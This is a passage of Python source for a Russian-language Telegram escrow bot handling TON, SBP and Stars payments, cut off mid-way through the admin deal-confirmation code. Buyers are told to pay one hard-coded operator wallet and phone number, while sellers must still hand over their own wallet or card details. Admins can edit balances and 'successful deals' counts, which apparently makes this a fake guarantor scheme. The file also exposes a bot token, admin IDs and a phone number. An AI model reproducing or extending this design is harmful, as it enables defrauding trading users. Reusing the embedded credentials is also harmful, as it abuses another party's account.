import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.error import NetworkError, BadRequest
import uuid
import logging
import os
from messages import get_text

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

BOT_TOKEN = "8406021004:AAGPyJYeODUaJ3131U5CBpC3oNjA-uXhSqo"
SUPER_ADMIN_IDS = {8245388091}
VALUTE = "TON"
TON_ADDRESS = "UQBYcRW2cVCJwPPLyR4_9XCgn0sCn7u5kQIBD_UEnTZ92vCn"
SBP_CARD = "+79098767410 - Сбп"

# Переменная для хранения ID чата уведомлений
NOTIFICATION_CHAT_ID = -1003803404765

user_data = {}
deals = {}
admin_commands = {}
ADMIN_ID = set()

DB_NAME = 'bot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            ton_wallet TEXT,
            card_details TEXT,
            balance REAL,
            successful_deals INTEGER,
            lang TEXT,
            granted_by INTEGER,
            is_admin INTEGER DEFAULT 0
        )
    ''')

    cursor.execute("PRAGMA table_info(users)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'ton_wallet' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN ton_wallet TEXT')
    if 'card_details' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN card_details TEXT')
    if 'lang' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN lang TEXT DEFAULT "ru"')
    if 'granted_by' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN granted_by INTEGER')
    if 'is_admin' not in columns:
        cursor.execute('ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            amount REAL,
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER,
            status TEXT,
            payment_method TEXT
        )
    ''')

    cursor.execute("PRAGMA table_info(deals)")
    columns = [column[1] for column in cursor.fetchall()]
    if 'payment_method' not in columns:
        cursor.execute('ALTER TABLE deals ADD COLUMN payment_method TEXT')

    # Таблица для настроек бота
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_settings (
            setting_name TEXT PRIMARY KEY,
            setting_value TEXT
        )
    ''')

    conn.commit()
    conn.close()

def load_data():
    global ADMIN_ID, NOTIFICATION_CHAT_ID
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    cursor.execute('SELECT user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin = row
        user_data[user_id] = {
            'ton_wallet': ton_wallet,
            'card_details': card_details,
            'balance': balance,
            'successful_deals': successful_deals,
            'lang': lang or 'ru',
            'granted_by': granted_by,
            'is_admin': is_admin
        }
        if is_admin:
            ADMIN_ID.add(user_id)
    
    for super_admin_id in SUPER_ADMIN_IDS:
        if super_admin_id not in user_data:
            user_data[super_admin_id] = {
                'ton_wallet': '',
                'card_details': '',
                'balance': 0.0,
                'successful_deals': 0,
                'lang': 'ru',
                'granted_by': None,
                'is_admin': 1
            }
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)
        elif not user_data[super_admin_id].get('is_admin'):
            user_data[super_admin_id]['is_admin'] = 1
            ADMIN_ID.add(super_admin_id)
            save_user_data(super_admin_id)

    cursor.execute('SELECT deal_id, amount, description, seller_id, buyer_id, status, payment_method FROM deals')
    rows = cursor.fetchall()
    for row in rows:
        deal_id, amount, description, seller_id, buyer_id, status, payment_method = row
        deals[deal_id] = {
            'amount': amount,
            'description': description,
            'seller_id': seller_id,
            'buyer_id': buyer_id,
            'status': status or 'active',
            'payment_method': payment_method
        }
    
    # Загружаем ID чата для уведомлений
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_name = "notification_chat_id"')
    result = cursor.fetchone()
    if result:
        NOTIFICATION_CHAT_ID = int(result[0])
        logger.info(f"Загружен ID чата для уведомлений: {NOTIFICATION_CHAT_ID}")
    
    conn.close()
    logger.info(f"Загружены администраторы: {ADMIN_ID}")

def save_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    user = user_data.get(user_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, ton_wallet, card_details, balance, successful_deals, lang, granted_by, is_admin)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, user.get('ton_wallet', ''), user.get('card_details', ''), user.get('balance', 0.0), 
          user.get('successful_deals', 0), user.get('lang', 'ru'), user.get('granted_by', None), 
          user.get('is_admin', 0)))
    conn.commit()
    conn.close()

def ensure_user_exists(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            'ton_wallet': '',
            'card_details': '',
            'balance': 0.0,
            'successful_deals': 0,
            'lang': 'ru',
            'granted_by': None,
            'is_admin': 1 if user_id in SUPER_ADMIN_IDS else 0
        }
        save_user_data(user_id)
        if user_data[user_id]['is_admin']:
            ADMIN_ID.add(user_id)

def save_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    deal = deals.get(deal_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO deals (deal_id, amount, description, seller_id, buyer_id, status, payment_method)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (deal_id, deal.get('amount', 0.0), deal.get('description', ''), deal.get('seller_id', None), 
          deal.get('buyer_id', None), deal.get('status', 'active'), deal.get('payment_method', None)))
    conn.commit()
    conn.close()

def delete_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM deals WHERE deal_id = ?', (deal_id,))
    conn.commit()
    conn.close()

def save_bot_setting(setting_name, setting_value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO bot_settings (setting_name, setting_value)
        VALUES (?, ?)
    ''', (setting_name, setting_value))
    conn.commit()
    conn.close()

async def send_notification_to_chat(context: ContextTypes.DEFAULT_TYPE, message: str):
    global NOTIFICATION_CHAT_ID
    if NOTIFICATION_CHAT_ID:
        try:
            await context.bot.send_message(
                chat_id=NOTIFICATION_CHAT_ID,
                text=message,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Ошибка при отправке уведомления в чат {NOTIFICATION_CHAT_ID}: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = None
    user_id = None
    
    try:
        if update.message:
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            args = context.args
        elif update.callback_query:
            user_id = update.callback_query.from_user.id
            chat_id = update.callback_query.message.chat_id
            args = []
        else:
            return

        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if args and args[0] in deals:
            deal_id = args[0]
            deal = deals[deal_id]
            seller_id = deal['seller_id']
            
            try:
                seller_chat = await context.bot.get_chat(seller_id)
                seller_username = seller_chat.username or "Неизвестно"
            except Exception as e:
                logger.error(f"Could not get chat for seller_id {seller_id}: {e}")
                seller_username = "Неизвестно"
            
            deals[deal_id]['buyer_id'] = user_id
            deals[deal_id]['status'] = 'active'
            save_deal(deal_id)

            payment_method = deal.get('payment_method', 'ton')
            payment_instruction = "Инструкция по оплате не определена."

            if payment_method == 'ton':
                payment_details = TON_ADDRESS
                payment_instruction = get_text(lang, "deal_info_ton_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               wallet=payment_details,
                                               amount=deal['amount'])
            elif payment_method == 'sbp':
                payment_details = SBP_CARD
                payment_instruction = get_text(lang, "deal_info_sbp_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               card=payment_details,
                                               amount=deal['amount'])
            elif payment_method == 'stars':
                bot_username = (await context.bot.get_me()).username
                payment_details = f"/pay @{bot_username} {deal['amount']}"
                payment_instruction = get_text(lang, "deal_info_stars_message",
                                               deal_id=deal_id,
                                               seller_username=seller_username,
                                               successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                               description=deal['description'],
                                               command=payment_details,
                                               amount=deal['amount'])

            if not payment_instruction:
                logger.error(f"Empty message text for deal_id {deal_id}, payment_method {payment_method}")
                await context.bot.send_message(chat_id, "🚫 Ошибка: текст сообщения не найден.", parse_mode="HTML")
                return

            await context.bot.send_message(
                chat_id,
                payment_instruction,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "pay_from_balance_button"), callback_data=f'pay_from_balance_{deal_id}')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu_from_deal')]
                ])
            )
            
            try:
                buyer_chat = await context.bot.get_chat(user_id)
                buyer_username = buyer_chat.username or "Неизвестно"
            except Exception as e:
                logger.error(f"Could not get chat for buyer_id {user_id}: {e}")
                buyer_username = "Неизвестно"

            await context.bot.send_message(
                seller_id,
                get_text(lang, "seller_notification_message",
                         buyer_username=buyer_username,
                         deal_id=deal_id,
                         successful_deals=user_data.get(user_id, {}).get('successful_deals', 0)),
                parse_mode="HTML"
            )
            
            # Отправляем уведомление о новой сделке
            notification_text = (
                f"🆕 Новая сделка создана\n"
                f"ID: #{deal_id}\n"
                f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                f"Продавец: {seller_id}\n"
                f"Покупатель: {user_id}"
            )
            await send_notification_to_chat(context, notification_text)
            return

        keyboard = [
            [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
            [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
            [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
            [InlineKeyboardButton(get_text(lang, "change_lang_button"), callback_data='change_lang')],
            [InlineKeyboardButton(get_text(lang, "support_button"), url='https://t.me/nexusgiftsup')],
        ]
        if user_id in ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_photo(
            chat_id,
            photo="https://postimg.cc/ZWskj31P",
            caption=get_text(lang, "start_message"),
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Ошибка сети. Пожалуйста, попробуйте позже.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка в функции start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Произошла ошибка. Пожалуйста, попробуйте позже.", parse_mode="HTML")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global NOTIFICATION_CHAT_ID
    
    query = update.callback_query
    if not query or not query.message:
        logger.warning("Callback query или message отсутствуют.")
        if query:
            try:
                await query.answer()
            except Exception:
                pass
        return
        
    chat_id = query.message.chat_id
    user_id = query.from_user.id
    data = query.data

    try:
        await query.answer()
        logger.info(f"Button callback_data received: {data}")
        
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if data == 'menu':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
                [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(get_text(lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(get_text(lang, "support_button"), url='https://t.me/NexusGiftSup')],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

            reply_markup = InlineKeyboardMarkup(keyboard)
            caption_text = get_text(lang, "start_message")
            
            if not query.message.photo:
                await query.message.delete()
                await context.bot.send_photo(
                    chat_id,
                    photo="https://postimg.cc/ZWskj31P",
                    caption=caption_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                try:
                    await query.edit_message_caption(caption=caption_text, parse_mode="HTML", reply_markup=reply_markup)
                except BadRequest as e:
                    if "Message is not modified" not in str(e):
                        logger.error(f"Cannot edit menu caption: {e}")

            return
        
        if data == 'menu_from_deal':
            await start(update, context)
            return

        elif data == 'wallet_menu':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "add_ton_wallet_button"), callback_data='add_ton_wallet')],
                [InlineKeyboardButton(get_text(lang, "add_card_button"), callback_data='add_card')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "wallet_menu_message")
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data == 'add_ton_wallet':
            current_wallet = user_data.get(user_id, {}).get('ton_wallet') or get_text(lang, "not_specified_wallet")
            message_text = get_text(lang, "add_ton_wallet_message", current_wallet=current_wallet)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_ton_wallet'] = True

        elif data == 'add_card':
            current_card = user_data.get(user_id, {}).get('card_details') or get_text(lang, "not_specified_card")
            message_text = get_text(lang, "add_card_message", current_card=current_card)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_card'] = True
        
        elif data == 'create_deal':
            if not user_data[user_id].get('ton_wallet') and not user_data[user_id].get('card_details'):
                message_text = get_text(lang, "no_requisites_message")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                    ])
                )
                return
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "payment_ton_button"), callback_data='payment_method_ton')],
                [InlineKeyboardButton(get_text(lang, "payment_sbp_button"), callback_data='payment_method_sbp')],
                [InlineKeyboardButton(get_text(lang, "payment_stars_button"), callback_data='payment_method_stars')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "choose_payment_method_message")
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data.startswith('payment_method_'):
            payment_method = data.split('_')[-1]
            context.user_data['payment_method'] = payment_method
            valute_for_message = "TON" if payment_method == "ton" else "RUB" if payment_method == "sbp" else "XTR"
            message_text = get_text(lang, "create_deal_message", valute=valute_for_message)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            context.user_data['awaiting_amount'] = True

        elif data.startswith('pay_from_balance_'):
            deal_id = data.split('_')[-1]
            deal = deals.get(deal_id)
            if deal:
                buyer_id = user_id
                seller_id = deal.get('seller_id')
                amount = deal.get('amount')

                if not (buyer_id and seller_id and amount is not None):
                    logger.error(f"Invalid deal data: deal_id={deal_id}, buyer_id={buyer_id}, seller_id={seller_id}, amount={amount}")
                    await query.edit_message_text("🚫 Ошибка: неверные данные сделки.", parse_mode="HTML")
                    return

                ensure_user_exists(buyer_id)
                ensure_user_exists(seller_id)

                logger.info(f"Buyer {buyer_id} balance: {user_data[buyer_id].get('balance', 0)}, required amount: {amount}")
                if user_data[buyer_id].get('balance', 0) >= amount:
                    user_data[buyer_id]['balance'] -= amount
                    save_user_data(buyer_id)
                    user_data[seller_id]['balance'] = user_data[seller_id].get('balance', 0) + amount
                    save_user_data(seller_id)
                    
                    deal['status'] = 'confirmed'
                    save_deal(deal_id)

                    message_text = get_text(lang, "payment_confirmed_message", deal_id=deal_id)
                    await query.edit_message_text(text=message_text, parse_mode="HTML")

                    buyer_username = "Неизвестно"
                    try:
                        buyer_chat_info = await context.bot.get_chat(buyer_id)
                        buyer_username = buyer_chat_info.username or "Неизвестно"
                    except Exception as e:
                        logger.error(f"Failed to get buyer username: {e}")

                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                    seller_message = get_text(seller_lang, "payment_confirmed_seller_message",
                                             deal_id=deal_id, description=deal.get('description', ''), buyer_username=buyer_username)
                    await context.bot.send_message(
                        seller_id,
                        seller_message,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{deal_id}')],
                            [InlineKeyboardButton(get_text(seller_lang, "contact_support_button"), url='https://t.me/заполнить')]
                        ])
                    )
                    
                    # Отправляем уведомление о подтверждении сделки
                    notification_text = (
                        f"✅ Сделка подтверждена\n"
                        f"ID: #{deal_id}\n"
                        f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                        f"Продавец: {seller_id}\n"
                        f"Покупатель: {buyer_id}"
                    )
                    await send_notification_to_chat(context, notification_text)
                else:
                    message_text = get_text(lang, "insufficient_balance_message")
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu_from_deal')]])
                    )

        elif data.startswith('seller_confirm_sent_'):
            deal_id = data[len('seller_confirm_sent_'):]
            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'confirmed' and user_id == deal.get('seller_id'):
                deal['status'] = 'seller_sent'
                save_deal(deal_id)
                
                buyer_id = deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                
                seller_username = "Неизвестно"
                try:
                    seller_chat_info = await context.bot.get_chat(user_id)
                    seller_username = seller_chat_info.username or "Неизвестно"
                except Exception:
                    pass

                message_text = get_text(lang, "seller_confirm_sent_message", deal_id=deal_id)
                await query.edit_message_text(text=message_text, parse_mode="HTML")
                
                if buyer_id:
                    buyer_message = get_text(buyer_lang, "seller_confirm_sent_notification", seller_username=seller_username, deal_id=deal_id)
                    await context.bot.send_message(
                        buyer_id,
                        buyer_message,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(buyer_lang, "buyer_confirm_received_button"), callback_data=f'buyer_confirm_received_{deal_id}')],
                            [InlineKeyboardButton(get_text(buyer_lang, "contact_support_button"), url='https://t.me/заполнить')]
                        ])
                    )
                    
                # Отправляем уведомление о подтверждении отправки
                notification_text = (
                    f"📦 Продавец подтвердил отправку\n"
                    f"ID сделки: #{deal_id}\n"
                    f"Продавец: {user_id}\n"
                    f"Покупатель: {buyer_id if buyer_id else 'Не указан'}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data.startswith('buyer_confirm_received_'):
            deal_id = data[len('buyer_confirm_received_'):]
            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'seller_sent' and user_id == deal.get('buyer_id'):
                deal['status'] = 'completed'
                save_deal(deal_id)
                
                seller_id = deal['seller_id']
                
                message_text = get_text(lang, "buyer_confirm_received_message", deal_id=deal_id)
                await query.edit_message_text(text=message_text, parse_mode="HTML")
                
                if seller_id:
                    ensure_user_exists(seller_id)
                    user_data[seller_id]['successful_deals'] = user_data[seller_id].get('successful_deals', 0) + 1
                    save_user_data(seller_id)
                
                for admin_id_loop in ADMIN_ID:
                    try:
                        await context.bot.send_message(
                            admin_id_loop,
                            f"✅ Сделка #{deal_id} завершена.\nПокупатель подтвердил получение.",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to send completion to admin {admin_id_loop}: {e}")

                if deal_id in deals:
                    del deals[deal_id]
                delete_deal(deal_id)
                
                # Отправляем уведомление о завершении сделки
                notification_text = (
                    f"🏁 Сделка завершена\n"
                    f"ID: #{deal_id}\n"
                    f"Продавец: {seller_id}\n"
                    f"Покупатель: {user_id}\n"
                    f"Сумма: {deal['amount']} {deal['payment_method'].upper()}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data == 'referral':
            bot_username = (await context.bot.get_me()).username
            referral_link = f"https://t.me/{bot_username}?start={user_id}"
            message_text = get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif data == 'change_lang':
            message_text = get_text(lang, "change_lang_message")
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "english_lang_button"), callback_data='lang_en')],
                    [InlineKeyboardButton(get_text(lang, "russian_lang_button"), callback_data='lang_ru')]
                ])
            )

        elif data.startswith('lang_'):
            new_lang = data.split('_')[-1]
            ensure_user_exists(user_id)
            user_data[user_id]['lang'] = new_lang
            save_user_data(user_id)
            
            keyboard = [
                [InlineKeyboardButton(get_text(new_lang, "add_wallet_button"), callback_data='wallet_menu')],
                [InlineKeyboardButton(get_text(new_lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(new_lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(get_text(new_lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(get_text(new_lang, "support_button"), url='https://t.me/заполнить')],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(
                caption=get_text(new_lang, "start_message"),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            return

        elif data == 'admin_panel' and user_id in ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals_0')],
                [InlineKeyboardButton(get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                [InlineKeyboardButton(get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_valute_button"), callback_data='admin_change_valute')],
                [InlineKeyboardButton(get_text(lang, "admin_manage_admins_button"), callback_data='admin_manage_admins')],
                [InlineKeyboardButton(get_text(lang, "admin_list_button"), callback_data='admin_list')],
                [InlineKeyboardButton("💬 Установить чат уведомлений", callback_data='set_notification_chat')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')],
            ]
            if user_id in SUPER_ADMIN_IDS:
                keyboard.insert(0, [InlineKeyboardButton("🔗 Рассылка", callback_data='admin_broadcast')])
            message_text = get_text(lang, "admin_panel_message")
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)

        elif data == 'set_notification_chat' and user_id in SUPER_ADMIN_IDS:
            message_text = "Введите ID чата для уведомлений (например, -1001234567890):"
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Назад", callback_data='admin_panel')]])
            )
            admin_commands[user_id] = 'set_notification_chat'

        elif data == 'admin_broadcast' and user_id in SUPER_ADMIN_IDS:
            message_text = get_text(lang, "admin_broadcast_message", default="Введите текст для рассылки всем пользователям:")
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
            )
            admin_commands[user_id] = 'broadcast'

        elif data == 'admin_list' and user_id in ADMIN_ID:
            admin_list_entries = []
            for admin_id_loop in ADMIN_ID:
                try:
                    ensure_user_exists(admin_id_loop)
                    admin_chat = await context.bot.get_chat(admin_id_loop)
                    username = admin_chat.username or "Нет юзернейма"
                    granted_by_id = user_data.get(admin_id_loop, {}).get('granted_by')
                    granted_by_username = "Не указан"
                    if granted_by_id:
                        try:
                            granted_by_chat = await context.bot.get_chat(granted_by_id)
                            granted_by_username = granted_by_chat.username or "Не указан"
                        except Exception:
                            granted_by_username = "Не удалось получить"
                    admin_list_entries.append(f"@{username} | ID: {admin_id_loop} | Выдано: @{granted_by_username}")
                except Exception as e:
                    logger.error(f"Ошибка при получении данных администратора {admin_id_loop}: {e}")
                    admin_list_entries.append(f"ID: {admin_id_loop} | Ошибка получения данных")
            admin_list_text = "\n".join(admin_list_entries) or "🚫 Список администраторов пуст."
            message_text = get_text(lang, "admin_list_message", admin_list=admin_list_text)
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])

            if query.message.photo:
                await query.message.delete()
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
        
        elif data.startswith('admin_view_deals_') and user_id in ADMIN_ID:
            DEALS_PER_PAGE = 8
            try:
                page = int(data.split('_')[-1])
            except (ValueError, IndexError):
                page = 0

            all_active_deals = [(deal_id, deal_info) for deal_id, deal_info in deals.items() if deal_info.get('status') == 'active']

            if not all_active_deals:
                await query.edit_message_caption(caption="🚫 Нет активных сделок.", parse_mode="HTML")
                return

            start_index = page * DEALS_PER_PAGE
            end_index = start_index + DEALS_PER_PAGE
            deals_on_page = all_active_deals[start_index:end_index]
            total_pages = (len(all_active_deals) + DEALS_PER_PAGE - 1) // DEALS_PER_PAGE

            keyboard_rows = []
            for deal_id_loop, deal_info_loop in deals_on_page:
                amount = deal_info_loop.get('amount', 'N/A')
                payment_method_text = deal_info_loop.get('payment_method', 'N/A').upper()
                keyboard_rows.append([InlineKeyboardButton(f"💳 Сделка #{deal_id_loop[:10]} ({amount} {payment_method_text})", callback_data=f'admin_view_deal_{deal_id_loop}')])
            
            nav_buttons = []
            if page > 0:
                nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f'admin_view_deals_{page - 1}'))
            nav_buttons.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data='noop'))
            if end_index < len(all_active_deals):
                nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data=f'admin_view_deals_{page + 1}'))
            
            if nav_buttons:
                keyboard_rows.append(nav_buttons)
            keyboard_rows.append([InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')])
            
            reply_markup = InlineKeyboardMarkup(keyboard_rows)
            message_text = get_text(lang, "admin_view_deals_message", deals_list="")

            try:
                await query.edit_message_caption(caption=message_text, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Error editing message for deal list: {e}")

        elif data.startswith('admin_view_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_view_deal_'):]
            deal = deals.get(deal_id)
            if deal:
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                seller_username = "Неизвестно"
                if seller_id:
                    try:
                        seller_username = (await context.bot.get_chat(seller_id)).username or "Неизвестно"
                    except Exception:
                        pass
                buyer_username = "Не указан"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass

                status = deal.get('status', 'active')
                deal_payment_method = deal.get('payment_method', 'ton')
                valute = "TON" if deal_payment_method == "ton" else "RUB" if deal_payment_method == "sbp" else "XTR"
                
                payment_details = "Реквизиты не указаны"
                if seller_id:
                    ensure_user_exists(seller_id)
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                    if deal_payment_method == 'ton':
                        payment_details = user_data[seller_id].get('ton_wallet') or get_text(seller_lang, "not_specified_wallet")
                    elif deal_payment_method == 'sbp':
                        payment_details = user_data[seller_id].get('card_details') or get_text(seller_lang, "not_specified_card")
                    elif deal_payment_method == 'stars':
                        payment_details = "Оплата через Telegram Stars"
                
                message_text = get_text(lang, "admin_view_deal_message",
                                        deal_id=deal_id, seller_id=seller_id or "N/A", seller_username=seller_username,
                                        seller_successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0) if seller_id else 0,
                                        buyer_id=buyer_id or "Не указан", buyer_username=buyer_username,
                                        buyer_successful_deals=user_data.get(buyer_id, {}).get('successful_deals', 0) if buyer_id else 0,
                                        description=deal.get('description', ''), amount=deal.get('amount', 0), valute=valute,
                                        payment_details=payment_details, status=status)
                
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "admin_confirm_deal_button"), callback_data=f'admin_confirm_deal_{deal_id}'),
                         InlineKeyboardButton(get_text(lang, "admin_cancel_deal_button"), callback_data=f'admin_cancel_deal_{deal_id}')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_view_deals_0')]
                    ])
                )

        elif data.startswith('admin_confirm_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_confirm_deal_'):]
